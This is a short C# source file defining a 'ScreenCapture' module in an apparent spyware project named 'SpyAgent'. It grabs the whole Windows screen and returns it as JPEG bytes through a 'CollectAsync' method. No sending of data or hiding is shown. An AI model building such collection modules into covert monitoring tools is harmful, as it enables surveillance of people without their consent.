namespace SpyAgent.Modules;

using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using SpyAgent.Core;

internal sealed class ScreenCapture : ISpyModule
{
    public string ModuleName => "ScreenCapture";

    public Task<byte[]?> CollectAsync()
    {
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            return Task.FromResult<byte[]?>(null);

        var width = GetSystemMetrics(0);
        var height = GetSystemMetrics(1);

        using var bitmap = new Bitmap(width, height, PixelFormat.Format24bppRgb);
        using var g = Graphics.FromImage(bitmap);
        g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));

        using var ms = new MemoryStream();
        var encoder = ImageCodecInfo.GetImageEncoders().First(e => e.FormatID == ImageFormat.Jpeg.Guid);
        var encoderParams = new EncoderParameters(1) { Param = { [0] = new EncoderParameter(Encoder.Quality, 60L) } };
        bitmap.Save(ms, encoder, encoderParams);

        return Task.FromResult<byte[]?>(ms.ToArray());
    }

    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);
}
